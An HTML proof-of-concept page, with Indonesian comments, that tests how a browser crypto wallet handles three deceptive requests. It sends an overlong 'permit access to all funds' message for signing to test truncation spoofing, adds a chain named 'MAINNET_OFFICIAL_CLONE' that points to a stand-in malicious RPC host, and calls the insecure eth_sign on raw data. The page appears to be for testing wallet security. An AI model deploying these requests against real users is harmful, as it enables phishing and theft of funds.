<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC Security Test Suite</title>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: #eee; padding: 20px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 500px; margin: auto; }
        button { padding: 15px; border-radius: 8px; border: 1px solid #f00; background: #330000; color: #ff5555; cursor: pointer; font-weight: bold; }
        #log { margin-top: 20px; background: #000; color: #0f0; padding: 10px; font-size: 11px; }
    </style>
</head>
<body>
    <div class="grid">
        <button onclick="spoof()">[1] UI Spoofing (Long String)</button>
        
        <button onclick="injectChain()">[2] Arbitrary Chain Injection</button>
        
        <button onclick="legacySign()">[3] Insecure eth_sign</button>
    </div>
    <pre id="log">Status: Menunggu eksekusi...</pre>

    <script>
        const log = (m) => document.getElementById('log').innerText = m;

        async function spoof() {
            const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
            // Mengirim pesan sangat panjang untuk menguji truncation/spoofing
            const longMsg = "0x" + "PERMIT_ACCESS_TO_ALL_FUNDS_".repeat(20);
            log("Spoofing: Mengirim pesan panjang untuk uji UI Truncation...");
            await window.ethereum.request({ method: 'personal_sign', params: [longMsg, accs[0]] });
        }

        async function injectChain() {
            log("Injection: Meminta penambahan chain menyesatkan...");
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                    chainId: '0x1337',
                    chainName: 'MAINNET_OFFICIAL_CLONE', // Nama menyesatkan
                    rpcUrls: ['https://malicious-rpc.example.com'],
                }]
            });
        }

        async function legacySign() {
            const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
            log("Insecure: Menggunakan eth_sign (metode lama)...");
            // Mengirim data raw agar dompet kesulitan memberi konteks
            await window.ethereum.request({ method: 'eth_sign', params: [accs[0], "0xdeadbeef"] });
        }
    </script>
</body>
</html>
